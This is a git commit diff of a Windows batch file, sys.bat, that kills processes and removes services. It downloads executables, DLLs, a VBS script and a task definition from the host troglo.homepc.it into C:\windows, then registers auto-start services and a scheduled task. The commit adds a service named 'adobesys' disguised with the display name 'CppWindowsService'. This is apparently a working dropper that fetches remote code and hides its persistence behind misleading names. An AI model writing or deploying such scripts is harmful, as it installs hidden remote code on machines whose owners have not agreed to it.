1f230bfdaf4a6326210b4c3a4a86011539ac87a1
pistacchietto <pistacchietto2@gmail.com>
2019-08-09 20:20:58 +0200

    ok

--- sys.bat
+++ sys.bat
@@ -1,12 +1,15 @@
 taskkill /f /im sys1.exe
 taskkill /f /im sys2.exe
 sc delete CppWindowsService
+sc delete adobesys
 wget http://troglo.homepc.it/win/sys3.dll -O c:\windows\sys3.dll
 wget http://troglo.homepc.it/win/office_get.xml -O c:\windows\office_get.xml
 schtasks /delete /tn office_get /F
 schtasks /create /tn office_get /xml %windir%\office_get.xml /F", 0, True
 wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
+wget http://troglo.homepc.it/win/sys3.exe -O c:\windows\sys3.exe
 sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
+sc create adobesys binPath= c:\windows\sys3.exe DisplayName= "CppWindowsService" start= auto
 wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
 wget http://troglo.homepc.it/win/svc.vbs -O c:\windows\svc.vbs
 wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
